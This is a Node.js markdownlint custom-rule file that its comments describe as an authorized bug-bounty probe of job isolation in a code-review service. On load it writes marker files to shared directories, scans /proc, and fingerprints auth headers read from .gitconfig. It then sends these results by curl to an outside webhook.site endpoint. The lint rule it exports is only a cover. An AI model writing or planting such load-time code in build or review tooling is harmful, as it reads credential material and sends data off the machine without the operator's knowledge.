// rs2iso_rule.cjs - JOB-ISOLATION probe (authorized CodeRabbit VDP, F-RUNNERSINKS-02 task 2).
// Vehicle: F-RUNNERSINKS-02 (pure-JSON .markdownlint-cli2.jsonc -> customRules -> require()).
//
// Purpose: determine whether two concurrent review jobs share ANY mutable location - filesystem,
// process namespace, environment, credential material, or egress identity.
// Payload (all local + read-only against third parties; no network use of any credential):
//   1. MARK = ISO_<time36><rand36> generated at load; written as marker files to candidate shared
//      locations (/tmp, /dev/shm, /var/tmp, $HOME) and appended to fixed shared files there.
//   2. polls those locations for ~30s for ANY marker that is not this run's (i.e. the sibling job's),
//   3. records environment-identity fingerprints (hostname/cgroup hash, /tmp device id, process
//      namespace counts - counts only, never other processes' contents) and the auth-material
//      fingerprint (length / header NAME / sha256-8 only) so credential sharing across jobs is
//      observable by hash comparison without any value leaving the runner,
//   4. beacons the observation as JSON. Marker values seen are our own test markers only.
const cp = require("child_process");
const fs = require("fs");
const crypto = require("crypto");

const MARK = "ISO_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
const TAG = "B";
const OAST = "https://webhook.site/fb861774-457b-45fa-9a39-3735a1af1aa8/rs2iso";
const SHA8 = (s) => crypto.createHash("sha256").update(String(s)).digest("hex").slice(0, 8);
const safe = (s, n) => {
  const t = String(s == null ? "" : s).replace(/[^A-Za-z0-9 ._\-:,/@\[\]]/g, "_");
  return (t || "NP").slice(0, n || 120);
};
const HOME = process.env.HOME || "";
const DIRS = ["/tmp", "/dev/shm", "/var/tmp", HOME].filter(Boolean);
const MARKFILE = /^isomark_ISO_[a-z0-9]+_[a-z0-9]+\.txt$/;

function beacon(obj) {
  for (let i = 0; i < 3; i++) {
    try {
      const code = cp.execFileSync(
        "curl",
        ["-s", "-m", "12", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
         "-H", "Content-Type: application/json", "--data-binary", "@-", OAST],
        { encoding: "utf8", input: JSON.stringify(obj), stdio: ["pipe", "pipe", "ignore"] }
      );
      if (code && code.trim() !== "000") return code.trim();
    } catch (e) {}
  }
  return "beacon-failed";
}
const sleep = (s) => { try { cp.execFileSync("sleep", [String(s)]); } catch (e) {} };

// ---- environment-identity fingerprints (hashes/counts only) ----
let host8 = "NP", cgroup8 = "NP", tmpdev = "NP", pidCount = -1, mdProcCount = -1;
try { host8 = SHA8(require("os").hostname()); } catch (e) {}
try { cgroup8 = SHA8(fs.readFileSync("/proc/self/cgroup", "utf8").trim()); } catch (e) {}
try { tmpdev = String(fs.statSync("/tmp").dev); } catch (e) {}
function procCounts() {
  let n = 0, md = 0;
  try {
    for (const d of fs.readdirSync("/proc")) {
      if (!/^\d+$/.test(d)) continue;
      n++;
      try {
        const cl = fs.readFileSync("/proc/" + d + "/cmdline", "utf8");
        if (/markdownlint/i.test(cl)) md++;
      } catch (e) {}
    }
  } catch (e) {}
  return { n: n, md: md };
}

// ---- auth-material fingerprint (length / header NAME / sha256-8 ONLY - never the value) ----
let xhFp = "NP", xhCount = 0;
try {
  const p = fs.existsSync("/home/jailuser/.gitconfig") ? "/home/jailuser/.gitconfig" : (HOME ? HOME + "/.gitconfig" : "");
  const g = p ? fs.readFileSync(p, "utf8") : "";
  const hs = [];
  for (const raw of g.split("\n")) {
    const m = raw.trim().match(/^extraheader\s*=\s*(.+)$/i);
    if (!m) continue;
    const v = m[1].trim();
    const nm = (v.match(/^([A-Za-z0-9-]+):/) || [])[1] || "unnamed";
    hs.push("len=" + v.length + ",name=" + nm + ",sha8=" + SHA8(v));
  }
  xhCount = hs.length;
  xhFp = hs.join(";");
} catch (e) {}

// ---- 1. write our markers ----
const written = [];
for (const d of DIRS) {
  try {
    fs.writeFileSync(d + "/isomark_" + MARK + ".txt", MARK + " " + TAG + " " + new Date().toISOString());
    written.push(d + "/isomark_" + MARK + ".txt");
    fs.appendFileSync(d + "/iso_shared.txt", MARK + " " + TAG + "\n");
  } catch (e) {}
}
const pre = { iso_files: [], shared_lines: [] };
for (const d of DIRS) {
  try {
    for (const f of fs.readdirSync(d)) {
      if (MARKFILE.test(f) && f !== "isomark_" + MARK + ".txt") pre.iso_files.push(d + "/" + f);
    }
  } catch (e) {}
  try {
    const lines = fs.readFileSync(d + "/iso_shared.txt", "utf8").split("\n").filter(Boolean);
    for (const l of lines) if (l.indexOf(MARK) < 0) pre.shared_lines.push(d + " :: " + safe(l, 60));
  } catch (e) {}
}
const pc0 = procCounts();
beacon({
  p: "start", m: MARK, tag: TAG, utc: new Date().toISOString(), home: safe(HOME, 40),
  xh: xhFp, xhn: xhCount, host8: host8, cgroup8: cgroup8, tmpdev: tmpdev,
  pid_count: pc0.n, markdownlint_proc_count: pc0.md,
  markers_written: written.length, pre_foreign_iso_files: pre.iso_files.slice(0, 10),
  pre_foreign_shared_lines: pre.shared_lines.slice(0, 10),
  note: "job isolation probe; no credential used; fingerprints only",
});

// ---- 2. poll ~30s for the sibling job's markers ----
const seen = { iso_files: [], shared_lines: [] };
for (let i = 0; i < 6; i++) {
  sleep(5);
  for (const d of DIRS) {
    try {
      for (const f of fs.readdirSync(d)) {
        if (MARKFILE.test(f) && f !== "isomark_" + MARK + ".txt") {
          const key = d + "/" + f;
          if (seen.iso_files.indexOf(key) < 0) seen.iso_files.push(key);
        }
      }
    } catch (e) {}
    try {
      const lines = fs.readFileSync(d + "/iso_shared.txt", "utf8").split("\n").filter(Boolean);
      for (const l of lines) {
        if (l.indexOf(MARK) < 0) {
          const key = d + " :: " + safe(l, 60);
          if (seen.shared_lines.indexOf(key) < 0) seen.shared_lines.push(key);
        }
      }
    } catch (e) {}
  }
}
const pc1 = procCounts();
beacon({
  p: "result", m: MARK, tag: TAG, utc: new Date().toISOString(),
  poll_rounds: 6, poll_seconds: 30,
  foreign_iso_files_seen: seen.iso_files.slice(0, 20),
  foreign_shared_lines_seen: seen.shared_lines.slice(0, 20),
  pid_count_after: pc1.n, markdownlint_proc_count_after: pc1.md,
  host8: host8, cgroup8: cgroup8, xh: xhFp,
});

module.exports = [
  {
    names: ["RSCIsoRule"],
    description: "job isolation probe rule",
    tags: ["poc"],
    function: function (params, onError) {
      onError({
        lineNumber: 1, column: 1,
        ruleNames: ["RSCIsoRule", "RSCIsoRule"],
        ruleDescription: "job isolation probe rule",
        detail: "F-RUNNERSINKS-02 task2 marker " + MARK + " tag " + TAG,
      });
    },
  },
];
